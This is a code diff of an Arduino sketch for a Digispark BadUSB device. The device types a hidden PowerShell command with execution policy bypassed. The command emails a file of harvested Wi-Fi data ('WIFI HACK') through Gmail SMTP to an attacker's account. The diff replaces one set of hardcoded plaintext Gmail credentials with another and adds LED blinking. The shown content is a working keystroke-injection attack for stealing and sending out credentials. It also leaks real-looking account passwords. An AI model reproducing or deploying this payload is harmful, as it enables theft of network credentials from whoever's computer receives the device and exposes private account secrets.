@@ -30,7 +30,7 @@ void setup() {
   DigiKeyboard.print("COLOR EF");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(100);
-  DigiKeyboard.print(F("powershell -NoP -NonI -W Hidden -Exec Bypass \"$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('rootlinuxunix','1237007@@'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'rootlinuxunix@gmail.com'; $ReportEmail.To.Add('rootlinuxunix@gmail.com'); $ReportEmail.Subject = 'WIFI HACK_MSR'; $ReportEmail.Body = 'Hack by STAR_MSR. - Regards Your MSR'; $ReportEmail.Attachments.Add('temp.csv'); $SMTPInfo.Send($ReportEmail)\""));
+  DigiKeyboard.print(F("powershell -NoP -NonI -W Hidden -Exec Bypass \"$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('iantmanojkashyap',\'Iant@123'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'iantmanojkashyap@gmail.com'; $ReportEmail.To.Add('iantmanojkashyap@gmail.com'); $ReportEmail.Subject = 'WIFI HACK'; $ReportEmail.Body = 'Hack - Regards'; $ReportEmail.Attachments.Add('temp.csv'); $SMTPInfo.Send($ReportEmail)\""));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
@@ -66,4 +66,10 @@ void setup() {
 }
 
 void loop() {
+  digitalWrite(0, HIGH);   // turn the LED on (HIGH is the voltage level)
+  digitalWrite(1, HIGH);
+  delay(1000);               // wait for a second
+  digitalWrite(0, LOW);    // turn the LED off by making the voltage LOW
+  digitalWrite(1, LOW); 
+  delay(1000);               // wait for a second
 }
